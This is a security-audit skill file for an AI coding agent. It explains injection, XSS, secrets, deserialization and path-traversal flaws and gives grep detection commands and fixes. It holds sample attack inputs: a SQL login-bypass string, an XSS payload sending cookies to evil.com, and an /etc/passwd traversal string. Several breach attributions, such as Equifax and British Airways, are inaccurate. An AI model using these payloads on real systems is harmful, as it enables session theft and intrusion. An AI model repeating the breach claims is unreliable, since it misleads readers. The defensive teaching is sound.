---
name: security-check
description: Security audit of codebase or recent changes. Checks for vulnerabilities, secrets, and security issues.
disable-model-invocation: true
allowed-tools:
  - Read
  - Grep
  - Glob
  - Bash
---

# Security Audit

Perform security review of the codebase or specific changes.

**⚠️ CRITICAL:** Security vulnerabilities can expose user data, allow unauthorized access, and compromise systems. Never treat security as optional.

---

## Critical Vulnerabilities Explained

### 1. SQL Injection (SQLi) - CRITICAL

**What it is:** Attacker injects malicious SQL through user input

**Impact:** 
- Read/Modify/Delete any database data
- Bypass authentication
- Execute arbitrary commands on database server
- Complete database compromise

**Example Attack:**
```
User input: ' OR '1'='1' -- 
Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'
Returns ALL users (bypasses authentication)
```

**Real World Impact:**
- 2017 Equifax breach: 143M records exposed via SQLi
- Sony Pictures 2011: SQLi led to complete network compromise
- Common in OWASP Top 10 since 2003

**Detection:**
```bash
# Find SQL concatenation in Java
grep -rn "\"SELECT\|\"INSERT\|\"UPDATE\|\"DELETE" --include="*.java" src/
grep -rn "+.*SELECT\|+.*INSERT" --include="*.java" src/

# Find SQL concatenation in JavaScript/TypeScript
grep -rn "`SELECT\|`INSERT\|`UPDATE" --include="*.ts" src/
grep -rn "\.query(.*+" --include="*.ts" src/
```

**Remediation:**
```java
// ❌ WRONG - String concatenation
String query = "SELECT * FROM users WHERE email = '" + email + "'";

// ✅ CORRECT - Parameterized query
String query = "SELECT * FROM users WHERE email = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, email);
ResultSet rs = stmt.executeQuery();

// ✅ CORRECT - JPA/ORM (safe by default)
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);
```

### 2. Cross-Site Scripting (XSS) - CRITICAL

**What it is:** Attacker injects malicious scripts into web pages

**Impact:**
- Steal user session cookies
- Impersonate users
- Deface websites
- Keylogging and credential theft
- Redirect users to malicious sites

**Types:**
- **Stored XSS:** Malicious script saved to database (affects all users)
- **Reflected XSS:** Script in URL/query params (affects specific user)
- **DOM XSS:** Client-side JavaScript manipulation

**Example Attack:**
```html
User input: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
If displayed without escaping: Script runs in victim's browser
```

**Real World Impact:**
- 2018 British Airways: 380,000 payment cards stolen via XSS
- 2019 Fortnite: XSS allowed account takeover
- Common in OWASP Top 10

**Detection:**
```bash
# Find unescaped output in templates
grep -rn "{{.*|safe\|{{{\|v-html\|dangerouslySetInnerHTML" --include="*.tsx" --include="*.jsx" src/

# Find innerHTML usage
grep -rn "\.innerHTML\s*=" --include="*.ts" --include="*.js" src/
```

**Remediation:**
```typescript
// ❌ WRONG - Unescaped output (React example)
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ CORRECT - Auto-escaped (React default)
<div>{userInput}</div>  // Automatically escaped!

// ✅ CORRECT - Explicit escaping
import { escapeHtml } from 'escape-html';
<div>{escapeHtml(userInput)}</div>

// ✅ CORRECT - DOMPurify for allowed HTML
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

### 3. Hardcoded Secrets - CRITICAL

**What it is:** API keys, passwords, tokens stored directly in code

**Impact:**
- Unauthorized access to production systems
- Data breaches
- Financial loss (cloud resources abuse)
- Complete system compromise

**Common Locations:**
- Configuration files (application.yml, .env)
- Source code comments
- Test files
- Documentation
- CI/CD pipeline files

**Real World Impact:**
- 2022 Uber: Hardcoded credentials led to breach of 57M users
- 2023 Twitch: Leaked credentials exposed source code
- Thousands of repos on GitHub contain exposed secrets

**Detection:**
```bash
# Scan with tools
git-secrets --scan
npm install -g detect-secrets && detect-secrets scan

# Manual grep (false positives likely)
grep -rn "password\|secret\|api_key\|token\|private_key" \
  --include="*.java" --include="*.ts" --include="*.yml" \
  --include="*.yaml" --include="*.properties" src/

# Check git history
git log --all --full-history -- '*.properties' '*.yml' '*.yaml'
```

**Remediation:**
```java
// ❌ WRONG - Hardcoded in code
String apiKey = "sk_live_51H...";

// ❌ WRONG - Hardcoded in config
api:
  key: sk_live_51H...  

// ✅ CORRECT - Environment variable
String apiKey = System.getenv("API_KEY");

// application.yml
api:
  key: ${API_KEY}  # From environment
```

```bash
# .gitignore
.env
.env.local
.env.production
*.pem
*.key
application-local.yml
secrets.yml
```

### 4. Insecure Deserialization - CRITICAL

**What it is:** Untrusted data deserialized without validation

**Impact:**
- Remote Code Execution (RCE)
- Complete server compromise
- Data tampering

**Real World Impact:**
- 2017 Equifax: Java deserialization led to massive breach
- 2020 Apache Struts: Multiple RCE vulnerabilities
- Common attack vector in Java applications

**Detection:**
```bash
# Java deserialization
grep -rn "ObjectInputStream\|readObject\|readUnshared" --include="*.java" src/
grep -rn "SerializationUtils.deserialize\|JSON.parseObject" --include="*.java" src/

# JavaScript/Node.js
grep -rn "eval\|new Function\|child_process" --include="*.ts" src/
```

**Remediation:**
```java
// ❌ WRONG - Deserializing untrusted data
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  // DANGEROUS!

// ✅ CORRECT - Use JSON with schema validation
User user = objectMapper.readValue(json, User.class);  // Type-safe

// ✅ CORRECT - If must use Java serialization, whitelist classes
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "!com.example.dangerous.*;java.base/*;!*"
);
ois.setObjectInputFilter(filter);
```

### 5. Path Traversal - HIGH

**What it is:** Attacker accesses files outside intended directory

**Impact:**
- Read sensitive files (/etc/passwd, application.yml)
- Delete/modify critical files
- Execute arbitrary code

**Example Attack:**
```
User input: ../../../etc/passwd
Result: Accesses system password file
```

**Detection:**
```bash
grep -rn "FileInputStream\|FileReader\|Paths.get" --include="*.java" src/
grep -rn "fs.readFile\|fs.writeFile\|require('path')" --include="*.ts" src/
```

**Remediation:**
```java
// ❌ WRONG - Direct path construction
String filePath = "/uploads/" + userInput;
File file = new File(filePath);

// ✅ CORRECT - Validate and canonicalize
Path basePath = Paths.get("/uploads").toAbsolutePath().normalize();
Path resolvedPath = basePath.resolve(userInput).normalize();

if (!resolvedPath.startsWith(basePath)) {
    throw new SecurityException("Path traversal attempt");
}

File file = resolvedPath.toFile();
```

---

## Security Checklist

### 🔴 Critical - Immediate Fix Required

## Scan Scope

- [ ] Full codebase audit
- [ ] Recent changes only (`git diff`)
- [ ] Specific file/feature

## Review Process

1. **Identify scope** - What to review (diff, file, feature)
2. **Scan for vulnerabilities** - Use checklist below
3. **Assess risk** - Rate severity of findings
4. **Recommend fixes** - Provide specific remediation

## Security Checklist

### 🔴 Critical - Secrets & Credentials
- [ ] No hardcoded API keys, passwords, tokens
- [ ] No secrets in logs or error messages
- [ ] `.env` files in `.gitignore`
- [ ] No secrets in git history

### 🔴 Critical - Injection
- [ ] SQL: Parameterized queries only
- [ ] XSS: User content escaped/sanitized
- [ ] Command injection: No shell with user input
- [ ] Path traversal: Validated file paths

### 🟡 Authentication & Authorization
- [ ] JWT properly validated
- [ ] Session management secure
- [ ] Authorization on every endpoint
- [ ] Password hashing (bcrypt/argon2)

### 🟡 Data Protection
- [ ] HTTPS enforced
- [ ] Sensitive data encrypted at rest
- [ ] PII handling compliant
- [ ] Proper CORS configuration

### 🟢 Backend Security
- [ ] Security headers set (CSP, HSTS, X-Frame-Options, X-Content-Type-Options)
- [ ] Rate limiting implemented (bucket, fixed window)
- [ ] CSRF protection for state-changing operations
- [ ] Request size limits enforced
- [ ] Timeout configurations set
- [ ] Error messages don't leak stack traces or sensitive info
- [ ] Debug mode disabled in production
- [ ] Dependencies up to date (npm audit, mvn dependency-check)

### 🟢 Frontend Security
- [ ] CSP (Content Security Policy) configured
- [ ] HTTPS-only (no mixed content)
- [ ] No sensitive data in localStorage/sessionStorage
- [ ] XSS protection (escape dynamic content)
- [ ] Subresource Integrity (SRI) for CDN resources
- [ ] Form autocomplete disabled for sensitive fields

## Input Validation

- Validate all inputs at API boundaries
- Use validation annotations (`@Valid`, `@NotBlank`, etc.)
- Sanitize user inputs before processing

## Secrets Management

- Never hardcode secrets, passwords, or API keys
- Never log sensitive data
- Use environment variables for configuration
- Never commit secrets to version control

## Authentication & Authorization

- Use HTTPS in production
- Implement proper JWT validation
- Apply least privilege principle
- Validate authorization on every protected endpoint

## SQL Injection Prevention

- Use parameterized queries
- Never concatenate user input into SQL
- Use ORM methods properly

## XSS Prevention

- Escape user-generated content
- Use Content Security Policy headers
- Validate and sanitize HTML inputs

## CSRF Prevention

### Backend (Java/Spring)

```java
// Enable CSRF protection (enabled by default in Spring Security)
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    .ignoringRequestMatchers("/api/public/**") // Exclude public endpoints
);
```

### Frontend

```typescript
// Include CSRF token in requests
fetch('/api/protected', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-TOKEN': getCsrfTokenFromCookie(),
  },
  body: JSON.stringify(data),
});
```

### When to Skip CSRF
- Stateless APIs with token authentication (JWT)
- Mobile app APIs
- Public read-only endpoints

## Rate Limiting

### Backend (Java/Spring)

```java
// Using Bucket4j
@Component
public class RateLimitingFilter extends OncePerRequestFilter {
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                    HttpServletResponse response, 
                                    FilterChain chain) throws ServletException, IOException {
        String clientId = getClientIdentifier(request);
        Bucket bucket = buckets.computeIfAbsent(clientId, k -> createBucket());
        
        if (bucket.tryConsume(1)) {
            chain.doFilter(request, response);
        } else {
            response.setStatus(429);
            response.getWriter().write("Too many requests");
        }
    }
    
    private Bucket createBucket() {
        return Bucket.builder()
            .addLimit(limit -> limit.capacity(100).refillGreedy(100, Duration.ofMinutes(1)))
            .build();
    }
}
```

### Backend (Node.js)

```typescript
// Using express-rate-limit
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api/', limiter);
```

### Rate Limiting Strategy

- **Strict limits** on auth endpoints (5 attempts per minute)
- **Moderate limits** on API endpoints (100 requests per 15 min)
- **Higher limits** for authenticated users vs anonymous
- **Different limits** per endpoint sensitivity

## Commands for Scanning

```bash
# Find potential secrets
grep -rn "password\|secret\|api_key\|token" --include="*.java" --include="*.ts"

# Check for SQL concatenation
grep -rn "\"SELECT\|\"INSERT\|\"UPDATE\|\"DELETE" --include="*.java"

# Find eval/exec usage
grep -rn "eval\|exec\|Runtime.getRuntime" --include="*.java" --include="*.ts"

# Check .env not committed
git ls-files | grep -i env

# Dependency vulnerabilities
npm audit
mvn dependency-check:check
```

## Output Format

### Scope
What was reviewed.

### Risk Assessment
CRITICAL / HIGH / MEDIUM / LOW

### 🔴 Critical Findings
| Issue | Location | Remediation |
|-------|----------|-------------|
| ... | ... | ... |

### 🟡 Warnings
| Issue | Location | Remediation |
|-------|----------|-------------|
| ... | ... | ... |

### 🟢 Low Priority
| Issue | Location | Remediation |
|-------|----------|-------------|
| ... | ... | ... |

### Recommendations
Prioritized list of security improvements.

### ✅ Passed Checks
List of security controls that are properly implemented
